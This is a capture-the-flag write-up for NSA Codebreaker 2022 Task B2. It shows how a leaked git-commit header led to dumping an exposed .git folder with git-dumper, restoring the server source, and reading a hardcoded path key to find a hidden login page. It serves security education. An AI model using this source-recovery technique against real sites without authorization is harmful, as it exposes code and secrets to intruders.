# Task B2

## Background
> It looks like the backend site you discovered has some security features to prevent you from snooping. They must have hidden the login page away somewhere hard to guess.
>
> Analyze the backend site, and find the URL to the login page.
>
> Hint: this group seems a bit sloppy. They might be exposing more than they intend to.
>
> **Warning**: Forced-browsing tools, such as DirBuster, are unlikely to be very helpful for this challenge, and may get your IP address automatically blocked by AWS as a DDoS-prevention measure. Codebreaker has no control over this blocking, so we suggest not attempting to use these techniques.
> ### Prompt
> Enter the URL for the login page

## Writeup
TL;DR: Dump the exposed Git folder, restore the working tree, and get the expected path key from the server files

We have the URL for the backend site from task B1, and if we just curl it, we get a 403. Since there's nothing interesting in the body, let's see if there's anything in the headers.
```bash
$ curl -i "https://xekflqhmhrsoelot.ransommethis.net"
HTTP/2 403
date: Sat, 26 Nov 2022 03:23:50 GMT
content-type: text/html; charset=utf-8
content-length: 412
server: nginx/1.23.1
x-git-commit-hash: 75e5832e838a7478cdbb41e4e9a449820a85b8a2

<html>
...
</html>
```

We can see one header that stands out: `x-git-commit-hash`. This means the server has probably also exposed the `.git/` folder, so we can try to see what's there.
```
$ curl https://xekflqhmhrsoelot.ransommethis.net/.git/
<html>
    <head>
        <title>Directory Listing Disabled</title>
    </head>
    <body>
        <h1>Directory Listing Disabled</h1>
        <p>Directory listing is not permitted for this directory.</p>
        <br>
        <br>
        <br>
        <hr>
        <small>This site is part of the <a href="https://nsa-codebreaker.org/">2022 NSA Codebreaker Challenge</a>.  Please do not submit any personal data to this site.</small>
    </body>
</html>
```

Unforunately, the server informs us that directory listing is disabled. However, the fact that we don't get a 404 or 403 means that we can still reconstruct the git folder, and thus source code; it'll just take a bit more work.

Fortunately, other people have taken the time to build tools to do just that. I personally used [GitTools](https://github.com/internetwache/GitTools), but obviously it isn't the only one that can do the job. For GitTools, the command looks like
```bash
GitTools/Dumper/git-dumper.sh https://xekflqhmhrsoelot.ransommethis.net/.git/ .git/
```
With the `.git` folder, we can reconstruct the working directory by simply running
```bash
git restore *
```

Looking at the files we've found, `app/server.py` seems the most promising. At the very bottom, we find the main route handler, which is defined as
```python
@app.route("/", defaults={'pathkey': '', 'path': ''}, methods=['GET', 'POST'])
@app.route("/<path:pathkey>", defaults={'path': ''}, methods=['GET', 'POST'])
@app.route("/<path:pathkey>/<path:path>", methods=['GET', 'POST'])
def pathkey_route(pathkey, path):
    if pathkey.endswith('/'):
		# Deal with weird normalization
		pathkey = pathkey[:-1]
		path = '/' + path

	# Super secret path that no one will ever guess!
	if pathkey != expected_pathkey():
		return render_template('unauthorized.html'), 403
    # ...
```

`expected_pathkey` is defined at the top of the file as
```python
def expected_pathkey():
	return "jphzwhdbesknahns"
```

This explains why just visiting `/` gives a 403; the first path component doesn't match this string. Therefore, the login page should be at `https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/login`, and putting this into the answer box gives us our task B2 badge!